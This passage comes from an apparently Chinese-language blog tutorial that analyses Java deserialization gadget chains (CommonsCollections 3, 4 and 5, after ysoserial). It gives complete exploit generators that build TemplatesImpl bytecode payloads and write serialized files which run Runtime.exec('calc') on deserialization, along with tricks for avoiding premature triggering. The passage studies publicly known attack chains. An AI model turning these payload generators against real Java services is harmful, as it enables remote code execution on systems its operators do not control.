java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3Method2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line">        <span class="comment">//创建第二个代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综合了cc1和cc2，利用了之前学过的动态代理。</p>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/230788">Ysoserial CommonsCollections1 详细分析</a></p>
<p><a href="https://www.anquanke.com/post/id/233393">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections4:4.0</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>在<code>commons-collections4:4.0</code>中，<code>InvokerTransfomer()</code>不能再用了，所以我们用到了</p>
<ul>
<li>cc2的前部分: PriorityQueue -&gt; TransformingComparator</li>
<li>cc3的后部分：InstanitateTransformer-&gt;TrAXFilter -&gt; TemplatesImpl</li>
</ul>
<h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;haha&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                constantTransformer,</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(constantTransformer,<span class="string">&quot;iConstant&quot;</span>,TrAXFilter.class);<span class="comment">//需要在最后一步修改，否则出错</span></span><br><span class="line"></span><br><span class="line">        setFieldValue(instantiateTransformer,<span class="string">&quot;iParamTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        setFieldValue(instantiateTransformer,<span class="string">&quot;iArgs&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们知道<code>PriorityQueue</code>在使用<code>add()</code>方法的时候，会执行其<code>comparator</code>，导致利用链会在序列化前就被触发而程序终止。所以我们需要在add之后再把我们利用链用到的东西放进去。例如<code>constantTransformer</code>和<code>InstantiateTransformer</code>都是如此，我们在add之后才对他们的参数进行修改。</p>
<p>因为我们只需要call到<code>chainedTransformer.transform()</code>方法，不需要像cc2链一样要向<code>InvokerTransformer</code>传数据，因此我们不需要在<code>queue</code>中添加构造的<code>templates</code>了。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4Method2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法的区别在于，我们不需要先伪装<code>transformers</code>里的各种<code>transformer</code>，相反，我们先创建一个不含自定义<code>comparator</code>的PriorityQueue，在add完之后，我们再将<code>comparator</code>加进这个<code>PriorityQueue</code>，这样就巧妙的绕过了<code>add()</code>触发点</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>cc4 = cc2和cc3的混合体</p>
<blockquote>
<p>Gadget chain:<br> ObjectInputStream.readObject()<br>     PriorityQueue.readObject()<br>       TransformingComparator()<br>         ChainedTransformer.transform()<br>             ConstantTransformer.transform()<br>                 InstantiateTransformer.transform()<br>                     TrAXFilter.TrAXFilter()<br>                         …<br>                             exec()</p>
</blockquote>
<h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/233393#h3-8">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.8</li>
</ul>
<h3 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><a href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer" class="headerlink" title="ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer"></a>ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</h4><p>在cc5后半部分，我们依然使用之前用过的利用链</p>
<blockquote>
<p>ChainedTransformer.transform()</p>
<p>​    ConstantTransformer.transform()</p>
<p>​        InvokerTransformer.transform()</p>
<p>​            Runtime.exec()</p>
</blockquote>
<p>在<code>commons-collections:3.1-3.2.1</code>中，我们的<code>InvokerTransformer</code>存在，所以可以继续利用它来作为我们利用链的一部分。</p>
<h4 id="LazyMap-1"><a href="#LazyMap-1" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>和cc1一样，我们选择使用**LazyMap.get()**来触发<code>ChainedTransformer.transform()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//此处会执行factory，我们将factory赋值为我们的chainedTrasnformer即可</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>LazyMap</code>的构造函数是<code>protected</code>的，我们可以用<code>LazyMap.decorate()</code>来得到我们想要的<code>LazyMap instance</code>，具体的在之前的cc1和cc3都有讲解过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们可以暂时写出如下payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span 